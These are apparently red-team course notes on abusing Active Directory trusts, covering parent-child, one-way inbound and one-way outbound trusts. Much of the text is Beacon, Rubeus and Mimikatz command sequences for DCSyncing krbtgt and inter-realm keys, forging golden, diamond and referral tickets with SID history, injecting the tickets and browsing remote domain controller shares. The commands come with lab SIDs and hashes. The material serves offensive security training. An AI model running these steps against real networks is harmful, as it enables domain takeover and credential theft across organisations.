Many Active Directory environments are more complex than a single, isolated, domain, and can have trust relationships with other forests and/or domains. 

Cheat sheet
```powershell
# Initial Enumeration of Trusts
beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
	# TrustDirection = 1 -> proceed to One-Way Inbound Trusts
	# TrustDirection = 2 -> proceed to One-Way Outbound Trusts
	# TrustDirection = 3 -> proceed to Parent-Child Tickets
```

Trust Summary
	![[Pasted image 20260107123156.png]]

Types of Trusts
	_Parent/Child Trust_ : 2 way transitive trust. Auto created when new domain is added to tree.
	_Tree-Root Trust_ : 2 way, transitive trust. Auto created when domain tree is added to forest.
	_External Trust_ : 1 OR 2 way, non-transitive trust. Enables resource sharing between forests.
	_Forest Trust_ : 1 OR 2 way, transitive trust. Enables resource sharing between forests.

Transitivity
	Transitivity of a trust determines whether the trust relationship should extend beyond the two parties with which it was formed. 
	![[Pasted image 20260107123838.png]]

Trust Direction
	The direction of a trust enables access to resources in either one or both directions.
	One-way trusts are also called inbound or outbound depending on which side you are on.
		Trusting vs Trusted domain
		direction of trust is opposite to direction of access
	NOTE: Two-way trusts do not actually exist, they are two one-way trusts in opposite directions.
	![[Pasted image 20260107124446.png]]
	Here, A can access C's resources. C TRUSTS users from A. Confusing...

Trusted Domain Objects (TDO)
	Store info on trust relationships
	Trust type, transitivity, and shared password
	Query TDO's
		`ldapsearch (objectClass=trustedDomain)` 
	Important Attributes
		_cn_
			FQDN
		_flatName_
			NetBIOS name of the domain
		_trustDirection_
			0 : `TRUST_DIRECTION_DISABLED`
			1 : `TRUST_DIRECTION_INBOUND`
			2 : `TRUST_DIRECTION_OUTBOUND`
			3 : `TRUST_DIRECTION_BIDIRECTIONAL`
		_trustAttributes_
			1 : `TRUST_ATTRIBUTE_NON_TRANSITIVE`
			4 : `TRUST_ATTRIBUTE_QUARANTINED_DOMAIN` - SID filtering
			8 : `TRUST_ATTRIBUTE_FOREST_TRANSITIVE` - Transitive trust of 2 forests
			32 : `TRUST_ATTRIBUTE_WITHIN_FOREST` - Trust of 2 domains within 1 forest
			64 : `TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL` - Trust of 2 domains in different forests. Also SID filtering

Security Boundaries
	Unofficially
		Defines scope of authority for admins in forests & domains
	Officially
		Only exists at forest level. Not possible to prevent admins from 1 domain to access another's data.
## Inter-Realm Tickets
Typical TGTs issued in a trusted realm cannot be decrypted by a trusting realm because it doesn't have access to the same krbtgt secret.

So how does Kerberos work across different realms?
	Inter-realm keys!

Overview
	![[Pasted image 20260107135234.png]]
	1. TGS-REQ w/ current TGT
		includes copy of normal TGT
		`realm` - set to trusted realm
		`sname` - contains SPN of target service
		![[Pasted image 20260107135845.png]]
	2. TGS-REP w/ inter-realm TGT
		KDC notices requested service is different realm
		returns TGS-REP containing inter realm TGT
			TGT issued by trusted realm but encrypted with inter-realm key (NOT krbtgt secret)
		`realm` - set to trusted realm
		`sname` - set to SPN of krbtgt service of TRUSTING realm
		![[Pasted image 20260107140141.png]]
	3. TGS-REQ w/ inter-realm TGT
		TGS-REQ directly to KDC of trusting realm
		![[Pasted image 20260107140314.png]]
	4. TGS-REP of service ticket
		Foreign KDC decrypts inter-realm TGT using copy of inter-realm key

Trust Accounts
	After a trust is created, the TGS of the TRUSTING realm is registered as a principal with the trusted realm's KDC.
	Not in ADUS, but can be queried

Query Trust Accounts
```powershell
beacon> ldapsearch (samAccountType=805306370) --attributes samAccountName
```
## Parent-Child Tickets
When a new domain is added to an existing tree, a two-way transitive trust is automatically created between it (the child) and its parent domain.

If an admin can gain domain privileges in a child domain, they can elevate to enterprise admin in the forest.
	Achieved by forging golden ticket with SID history

Elevating Privileges from Child to Parent Domain (HIGH-INTEGRITY)
```powershell
# Enumerate type of trust in place
beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName   # TrustDirection = 3

# Obtain AES256 hash of child domain krbtgt account
beacon> dcsync dublin.contoso.com DUBLIN\krbtgt

# Obtain domain SID for child domain
beacon> ldapsearch (objectClass=domain) --attributes objectSid

# Identify parent dc
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick Get-DomainController -Domain contoso.com | select -ExpandProperty Name

# Obtain domain SID of parent domain
beacon> ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com # set dn to PARENT distignuished name
	# NOTE: Add -519 to end of SID for EA group. Use this in ticket forgery.

# Craft golden ticket (offline)
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:[Child krbtgt hash] /user:Administrator /domain:dublin.contoso.com /sid:[child domain SID] /sids:[parent domain EA group SID] /outfile:C:\path\to\file
    # /aes256 = the AES hash of the child domain's krbtgt account.
    # /user = the user you want to impersonate.
    # /domain = the child domain.
    # /sid = the SID of the child domain.
    # /sids = list of SIDs you want in the ticket's SID history. Usually parent domain SID + 519 at end (Enterprise Admins group)
    /nowrap # Alternative to /outfile

# ALTERNATIVE - Craft Diamond ticket (GOOD OPSEC) - DO AS MEDIUM INTEGRITY
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
	512 = domain admins
	519 = enterprise admins
	# /tgtdeleg gets a usable TGT for the current user.
	# /ticketuser = the user you want to impersonate.
	# /ticketuserid = the RID of the impersonated user.
	# /sids = a list of SIDs you want in the ticket's SID history. Usually parent domain SID + 519 at end (Enterprise Admins group)
	# /krbkey = the AES256 hash of the child domain's krbtgt account. 

# Inject ticket into Beacon
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\[TICKET]
# Alternative (/NOWRAP)
beacon> make_token CONTOSO\Administrator FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIF5[...snip...]5DT00=

# Verify (BAD OPSEC)
beacon> run klist

# Abuse
beacon> ls \\lon-dc-1\c$   # Accessing forest root DC 
```

## One-Way Inbound Trusts
A one-way trust is created when administrators want to share resources with a trusted domain, but they don't want their resources to be accessed from the trusting domain. ie: data transfer.

If adversary is on trusted domain side, they can access resources in trusting domain by design.

How to abuse?
	impersonate principals in trusted domain configured with access to resources in trusting domain
	Golden tickets with SID history do not work in these cases because external trusts employ something called SID filtering.
	We need to enumerate Foreign Security Principals container - [foreignSecurityPrincipal](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/65f7d03b-8542-4a6f-8b42-ae5247f7656a)
		represent security principals from external trusted domain that are allowed to become members in trusting domain

Abusing One-way Inbound Trusts w/ Referral Ticket
	in this scenario, contoso is TRUSTED and partner is TRUSTING
```powershell
# Enumerate TDOs
beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName   # trustDirection = 1
	# Make note of flatName (NETBIOSNAME)

# Enumerate Foreign Security Principals Container
beacon> ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com
	# DEFAULTS (ignore) - S-1-5-4, S-1-5-9, S-1-5-11, S-1-5-17
	# Make note of non-default SIDs

# Query non-default SID to identify it
beacon> ldapsearch (objectSid=NON-DEFAULT-SID)
	# Analyse it to see if we can use it

# Enumerate hosts on foreign domain (optional step?)
beacon> ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=partner,DC=com --hostname partner.com
# Enumerate everything manually OR feed data into bloodhound via BOFHound

# DCSync the shared inter-realm key
beacon> make_token [DOMAIN\user] Passw0rd!      # elevate to High-Integrity
beacon> dcsync contoso.com CONTOSO\[flatName]$
	# make note of NTLM hash
beacon> rev2self

# Forge a referral ticket (offline) -- USE NTLM, Trusts use RC4 by default
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap 
    # /user = the username to impersonate.
    # /domain = the FQDN of the trusted domain.
    # /sid = the SID of the trusted domain. 
    # /id = the RID of the impersonated user.
    # /groups = the RIDs of the impersonated user's domain groups.  Domain Users is 513, Workstation Admins is 1106, and Partner Jump Users is 6102. IMPORTANT
    # /service = the krbtgt service of the trusting domain.
    # /rc4 = the inter-realm key (NTLM).

# Request service tickets from trusting domain
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:doIFM[...snip...]mNvbQ== /nowrap
    # /service = the target service in the trusting domain.
    # /dc = a domain controller in the trusting domain.
    # /ticket = the inter-realm TGT.

# sacrificial process IMPORTANT
beacon> make_token CONTOSO\ngreen FakePassword

# Inject Service ticket into current logon session
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TICKET]

# Verify
beacon> run klist

# Abuse
beacon> ls \\par-jmp-1.partner.com\c$
```

## One-Way Outbound Trusts
An adversary may also find themselves on the 'wrong' side of a one-way trust, i.e. the trusting side. Attempting to enumerate the foreign domain will typically fail with error code 49 - invalid creds.

So what can we do?
	We can still impersonate principals in the trusted domain
	And we can obtain the password of the trust account
		trust account is created using the flat name of the trusting domain
		password = shared inter-realm key
		Trusting domain has a copy of the key stored in TDO - BINGO

Abusing One-way Outbound Trusts
```powershell
# Enumerating TDO one-way trust
ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName   # trustDirection = 2
	# make note of DN? 

# Grab TDO's objectGUID
beacon> ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID

# Capture shared inter-realm key from TDO, grab NTLM hash
beacon> mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
	# [Out] = Current key
	# [Out-1] = Previous key

# Ask for TGT from trusted domain
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:[TRUSTING flatName]$ /domain:[TRUSTED DOMAIN.COM] /dc:lon-dc-1.contoso.com /rc4:[NTLM HASH] /nowrap

# Inject into logon session (High-Integrity)
beacon> make_token CONTOSO\PARTNER$ FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TICKET]

# Verify
beacon> run klist

# Enumerate, etc...
beacon> ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com
```
Why does this work?
	primaryGroupID of the trust account is 513 - same privs as domain users.
	all due to legacy Portable Operating System Interface (POSIX) support.

What next?
	enumerate trusted domain
	find vulns, roastable users, ADCS instances, etc...